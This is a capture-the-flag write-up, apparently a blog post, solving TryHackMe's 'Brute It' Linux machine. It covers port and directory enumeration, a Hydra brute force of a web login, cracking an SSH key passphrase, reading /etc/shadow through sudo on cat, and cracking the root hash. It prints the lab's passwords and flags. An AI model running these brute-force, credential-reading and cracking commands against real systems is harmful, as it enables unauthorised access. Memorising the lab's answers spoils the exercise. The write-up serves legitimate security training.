@@ -1,0 +1,269 @@
+---
+title: 'Brute It'
+description: 'Brute forcing a web form with Hydra, cracking an SSH private key, escalation via a misconfigured sudo and cracking the root password hash.'
+publishDate: 2026-09-01
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Difficulty:** Easy **Category:** Web enumeration, web-form brute force (Hydra), SSH private-key cracking, privilege escalation via misconfigured `sudo`, cracking `/etc/shadow` **Room:** [https://tryhackme.com/room/bruteit](https://tryhackme.com/room/bruteit)
+
+## Room description
+
+A Linux machine centred on the full credential-attack cycle: brute force against a web panel, extraction and cracking of a passphrase-protected SSH private key, and finally privilege escalation by exploiting an overly broad `sudo` permission on `/bin/cat`, which allows reading the `/etc/shadow` file and cracking the root password hash.
+
+> **Note on placeholders:** `{IP}` / `target` stands for the IP TryHackMe assigns (it changes on every deploy). Users (`admin`, `john`, `root`), paths (`/admin/panel/id_rsa`) and the passwords shown are fixed on this machine.
+
+---
+
+## 1. Environment setup
+
+```bash
+mkdir -p brute_it/{scans,content,scripts,loot,exploits} && cd brute_it
+settarget {IP}
+```
+
+---
+
+## 2. Port scan
+
+```bash
+nmap -p- --open -T5 -v -n target -oG scans/initial-scan
+extractPorts scans/initial-scan
+```
+
+- `-p-` / `--open`: scans all TCP ports and shows only the open ones.
+- `-T5`: aggressive timing.
+- `-v -n`: verbose, no DNS resolution.
+- `-oG`: “grepable” output for processing with `extractPorts`.
+
+**Expected ports:**
+
+| Port   | Service       |
+| ------ | ------------- |
+| 22/tcp | SSH (OpenSSH) |
+| 80/tcp | HTTP (Apache) |
+
+It is recommended to complement with a version scan over the found ports:
+
+```bash
+nmap -sV -sC -p22,80 {IP} -oN scans/detailed-scan
+```
+
+---
+
+## 3. Web enumeration and hidden directory
+
+```bash
+gobuster dir -u http://target/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak -t 30
+```
+
+- `-x php,html,txt,bak`: tries these extensions in addition to directory names.
+- `-t 30`: 30 concurrent threads.
+
+**Relevant result:**
+
+```
+/admin (Status: 301) --> http://target/admin/
+```
+
+Visiting `http://{IP}/admin/`, a login form appears. Before launching any brute-force attack it is worth **reviewing the page’s HTML source** (`Ctrl+U` in the browser, or `curl -s http://{IP}/admin/`), where a comment left by the developer is usually found:
+
+```html
+<!-- Hey john, if you do not remember, the username is admin -->
+```
+
+This comment confirms the user **`admin`** for the panel, and in passing reveals the name of a system user (**`john`**) that reappears later as an SSH account.
+
+---
+
+## 4. Brute forcing the web panel with Hydra
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt {IP} http-post-form "/admin/:user=^USER^&pass=^PASS^:invalid" -t 4
+```
+
+Breakdown of the `http-post-form` module, which has 3 parts separated by `:`:
+
+1. **Form path**: `/admin/` (or `/admin/index.php`, depending on how the login is implemented).
+2. **POST request body**: `user=^USER^&pass=^PASS^` — Hydra replaces `^USER^` and `^PASS^` with each tried combination of the fixed user (`admin`) and each dictionary word.
+3. **Failure string**: `invalid` — a text fragment Hydra looks for in the HTTP response to know the attempt **failed** (for example, the “Username or password invalid” message). If that string does **not** appear in the response, Hydra assumes the login succeeded.
+
+Additional parameters:
+
+- `-l admin`: fixed user (obtained from the HTML comment).
+- `-P rockyou.txt`: password dictionary.
+- `-t 4`: 4 concurrent threads (moderate, to avoid overloading the web server or triggering blocks).
+
+**Credentials obtained:**
+
+```
+user: admin
+password: xavier
+```
+
+Logging into the panel with these credentials reveals a first flag:
+
+<Flag value="THM{brut3_f0rce_is_e4sy}" />
+
+---
+
+## 5. Extracting the SSH private key
+
+Inside the admin panel there is a link or reference to an `id_rsa` file, hosted at a path like `/admin/panel/id_rsa`. Download it:
+
+```bash
+wget http://target/admin/panel/id_rsa
+```
+
+Adjust the permissions, since SSH refuses to use private keys with overly open permissions (a key readable by “others” is considered insecure):
+
+```bash
+chmod 600 id_rsa
+```
+
+### 5.1 Connection attempt (fails on passphrase)
+
+```bash
+ssh -i id_rsa john@{IP}
+```
+
+As expected, the key is protected by a **passphrase**, so SSH will ask for it and the connection will not proceed without it. Time to crack it offline.
+
+---
+
+## 6. Cracking the RSA key passphrase
+
+```bash
+python3 /usr/share/john/ssh2john.py id_rsa > id_rsa_hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
+```
+
+- `ssh2john.py`: converts the encrypted private key into a hash format compatible with John the Ripper, representing the passphrase’s cryptographic protection in a form suitable for an offline dictionary attack.
+- `john --wordlist=...`: launches the dictionary attack against that hash.
+
+To see the found password explicitly (if not shown automatically on finishing):
+
+```bash
+john --show id_rsa_hash
+```
+
+**Passphrase obtained: `rockinroll`**
+
+---
+
+## 7. SSH access as John
+
+```bash
+ssh -i id_rsa john@{IP}
+# Key passphrase: rockinroll
+```
+
+Once inside, you can capture the first system flag (user flag):
+
+```bash
+cat /home/john/user.txt
+```
+
+<Flag value="THM{a_password_is_not_a_barrier}" />
+
+---
+
+## 8. Privilege escalation
+
+### 8.1 Enumerating sudo permissions
+
+```bash
+sudo -l
+```
+
+Expected output:
+
+```
+User john may run the following commands on brute-it:
+    (root) NOPASSWD: /bin/cat
+```
+
+This means `john` can run `/bin/cat` **as root, without needing a password**. Since `cat` is a read-only binary, it seems harmless on the surface — but it allows reading **any file on the system**, including those normally restricted to root, like `/etc/shadow`.
+
+(Additionally, these notes show `find / -perm -4000 -type f 2>/dev/null`, a standard command to enumerate binaries with the **SUID** bit set — a technique complementary to `sudo -l` to look for other possible escalation vectors. On this machine, the real vector ends up being the `sudo` permission on `cat`, not a SUID.)
+
+### 8.2 Reading `/etc/shadow`
+
+```bash
+sudo /bin/cat /etc/shadow
+```
+
+This exposes all the system’s password hashes, including the line corresponding to `root`:
+
+```
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+```
+
+The `$6$` prefix indicates the hash uses the **SHA-512crypt** algorithm (the standard `/etc/shadow` format on modern Linux).
+
+### 8.3 Cracking the root hash
+
+Save the full line (or just the hash field, depending on the format `john` expects) in a file:
+
+```bash
+echo 'root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::' > root_hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
+```
+
+- Saving the line in `user:hash:...` format (just as it appears in `/etc/shadow`) lets John automatically detect the correct format without needing to specify it with `--format`.
+- Alternatively, you can use `hashcat -a 0 -m 1800 root_hash.txt rockyou.txt`, where `-m 1800` indicates the mode for `sha512crypt $6$` (faster if you have a GPU).
+
+**Password obtained: `football`**
+
+---
+
+## 9. Getting root access and the final flag
+
+```bash
+su root
+# password: football
+```
+
+With the root session active, capture the final flag:
+
+```bash
+cat /root/root.txt
+```
+
+> An alternative without needing `su`, reusing the same `sudo` permission on `cat` used before: `sudo /bin/cat /root/root.txt`.
+
+---
+
+## 10. Attack chain summary
+
+1. **Recon** with `nmap` → SSH (22) and HTTP (80).
+2. **Directory fuzzing** with `gobuster` → discover `/admin`.
+3. **Source review** of the login panel → HTML comment reveals user `admin` (and in passing, the name `john`).
+4. **Web-form brute force** with `hydra` (`http-post-form`) → password `xavier` → first flag.
+5. **Download of the SSH private key** (`id_rsa`) exposed inside the admin panel.
+6. **Offline cracking of the passphrase** with `ssh2john` + `john` → `rockinroll`.
+7. **SSH access** as `john` → user flag.
+8. **sudo enumeration** (`sudo -l`) → unrestricted permission on `/bin/cat`.
+9. **Reading `/etc/shadow`** via `sudo cat` → obtain the root password hash.
+10. **Cracking the SHA-512crypt hash** with `john`/`hashcat` → `football`.
+11. **Escalation to root** with `su` → final flag.
+
+## 11. Lessons learned / key concepts
+
+- **HTML comments left in production** are a surprisingly common source of information leakage: you should always review the source of any form or panel before attacking it blindly.
+- **`hydra` with `http-post-form`** requires a good understanding of the 3-part syntax (path, body, failure/success string) — a common mistake is using the wrong string and generating massive false positives or negatives.
+- **SSH keys with a weak passphrase** are as vulnerable as a normal password against known dictionaries (`rockyou.txt`).
+- **`sudo` permissions on read binaries like `cat`** are as dangerous as permissions on execution binaries: they allow reading any protected file on the system, including `/etc/shadow`, opening the door to offline-cracking the passwords of **all** users, root included.
+- **`find / -perm -4000`** (searching for SUID binaries) is a standard enumeration step worth always running, even when the final vector turns out to be something else (here, a misconfigured `sudo`).
+
+## 12. Tools used
+
+`nmap`, `gobuster`, a browser / `curl` (source inspection), `hydra`, `wget`, `ssh2john`, `john the ripper`, the `ssh` client, `sudo`, (optionally `hashcat`).
+
+---
+
+_Academic write-up, built from my own notes solving the “Brute It” machine on TryHackMe, supplemented with public community write-ups to complete the discovery of the `admin` user via the HTML comment and the detail of the `http-post-form` attack with Hydra._
